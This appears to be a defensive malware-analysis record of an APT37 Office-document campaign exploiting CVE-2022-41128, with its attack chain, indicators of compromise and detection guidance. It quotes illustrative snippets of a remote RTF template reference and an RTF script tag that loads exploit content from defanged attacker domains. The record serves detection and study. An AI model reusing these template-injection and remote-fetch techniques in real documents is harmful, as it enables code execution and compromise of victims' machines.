package_info.package_name: APT37 CVE-2022-41128 Malicious Office Document Campaign
package_info.package_manager: Malicious Microsoft Office Documents (malware delivery via Office/RTF/HTML)
package_info.package_versions: N/A (malicious documents, not a software package)
package_info.why_malicious: The documents are weaponized to exploit CVE-2022-41128 in Internet Explorer's JavaScript engine via remote RTF templates, leading to arbitrary code execution, C2 communication, and anti-forensics actions. The entire delivery chain is designed for exploitation and post-exploitation activity.

malicious_snippets.code_snippet:
Remote template injection: The Office document contains a reference to a remote RTF template, e.g.,

<o:OLEObject Type="Embed" ProgID="Word.Document" ShapeID="_x0000_i1025" DrawAspect="Content" ObjectID="..." r:id="rId1"/>

where rId1 points to a remote RTF file (e.g., http://word-template[.]net/template.rtf).
malicious_snippets.code_behavior: When the user opens the document, the Office application fetches a remote RTF template over HTTP from an attacker-controlled domain, causing the client to download and render malicious content, which initiates the exploitation chain.

malice_analysis.why_suspicious: Legitimate Office documents rarely reference remote RTF templates, especially from untrusted or external domains. This is a well-documented malware delivery technique used to bypass static analysis and deliver weaponized content.
malice_analysis.violated_expectations: Normal Office documents embed all required content or use templates from trusted, internal sources. Fetching templates from unknown or suspicious domains is highly abnormal and risky.
malice_analysis.similar_legitimate_use: Corporate environments may use remote templates, but only from internal, trusted servers and over secure channels.
key_indicators: Office document referencing remote RTF template via external HTTP URL
Template reference points to non-corporate, untrusted domain
Network activity initiated by Office application upon document open

execution_context.file_location: Remote RTF template (downloaded from attacker server)

malicious_snippets.code_snippet:
RTF template contains an embedded HTML object that loads remote HTML content, e.g.,

{\object\objocx ... <html><script src="http://openxmlformat[.]org/exploit.html"></script></html> ... }
malicious_snippets.code_behavior: When the RTF template is loaded by Office, it causes Internet Explorer to render attacker-controlled HTML/JavaScript from a remote domain, which exploits CVE-2022-41128 in jscript9.dll, resulting in execution of attacker-supplied shellcode.

malice_analysis.why_suspicious: Embedding HTML/JavaScript in RTF templates is a known exploitation vector, especially when the content is loaded from untrusted domains. The use of a known exploit (CVE-2022-41128) further confirms malicious intent.
malice_analysis.violated_expectations: RTF templates should not contain active HTML/JavaScript objects, nor should they trigger browser rendering of remote scripts. Such behavior is never expected in standard document workflows.
malice_analysis.similar_legitimate_use: Extremely rare; almost never legitimate in business workflows. Some legacy forms may embed objects, but not active scripts from external sources.
key_indicators: RTF template with embedded HTML/JavaScript object
Script tag referencing external exploit domain
Triggering Internet Explorer rendering from within Office
Presence of exploit code targeting CVE-2022-41128

execution_context.file_location: Shellcode delivered via exploit (injected into process memory)

malicious_snippets.code_behavior: After successful exploitation, the shellcode executes in the context of the victim process, resolves Windows APIs using a custom hashing algorithm, communicates with the C2 server before and after execution, clears Internet Explorer cache and history to remove forensic evidence, and downloads the next stage payload for further compromise.

malice_analysis.why_suspicious: Custom API resolution, C2 communication, anti-forensics (clearing browser cache/history), and staged payload download are all hallmarks of advanced malware and are never present in benign Office document scenarios.
malice_analysis.violated_expectations: Normal code does not erase browser history, inject shellcode, or communicate with C2 servers in the context of document processing. These actions are exclusive to malicious post-exploitation activity.
malice_analysis.similar_legitimate_use: Custom API resolution may be used in software protection or DRM, but not in the context of Office documents or shellcode delivered via exploits.
key_indicators: Custom API hashing and dynamic resolution in shellcode
C2 communication before and after shellcode execution
Staged download of additional payloads after exploitation

attack_chain.action: User opens malicious Office document, which references a remote RTF template hosted on an attacker-controlled domain.
attack_chain.leads_to: Download and execution of remote RTF template containing embedded exploit code.

attack_chain.action: Office downloads and loads the remote RTF template, which contains an embedded HTML/JavaScript object referencing attacker infrastructure.
attack_chain.leads_to: Triggering of Internet Explorer to render attacker-controlled HTML/JavaScript, setting up exploitation.

attack_chain.action: Internet Explorer processes the malicious HTML/JavaScript, exploiting CVE-2022-41128 in jscript9.dll to execute attacker-supplied shellcode in memory.
attack_chain.leads_to: Arbitrary code execution (shellcode runs in victim context), enabling post-exploitation actions.

attack_chain.action: Shellcode resolves APIs, communicates with C2, clears forensic artifacts, and downloads the next stage payload for further compromise.
attack_chain.leads_to: Establishment of persistence or further post-exploitation, such as data theft or lateral movement.

behavioral_signatures: Office documents referencing remote RTF templates from untrusted or non-corporate domains
RTF templates containing embedded HTML/JavaScript objects that trigger browser rendering
Unexpected spawning of Internet Explorer process by Office applications
Shellcode activity that clears browser cache/history and initiates staged C2 communication
file_indicators: Office documents (.doc, .docx) with remote template references in XML or OLEObject fields
RTF files containing embedded HTML/JavaScript objects or script tags referencing external domains
Unusual process tree: Office application (e.g., WINWORD.EXE) spawning Internet Explorer (iexplore.exe), followed by in-memory shellcode execution
network_indicators: HTTP/HTTPS connections to word-template[.]net, openxmlformat[.]org, ms-office[.]services, ms-offices[.]com, template-openxml[.]com
Outbound C2 communication from Office or Internet Explorer processes before and after shellcode execution
detection_knowledge.how_to_detect: Monitor for Office documents that reference remote RTF templates, especially those pointing to suspicious or non-corporate domains. Flag RTF files with embedded HTML/JavaScript objects or script tags. Detect Office processes spawning Internet Explorer unexpectedly, and monitor for in-memory shellcode activity such as custom API resolution and browser cache/history clearing. Track outbound connections to known C2 domains and correlate with unusual Office/IE process behavior to identify exploitation and post-exploitation activity.
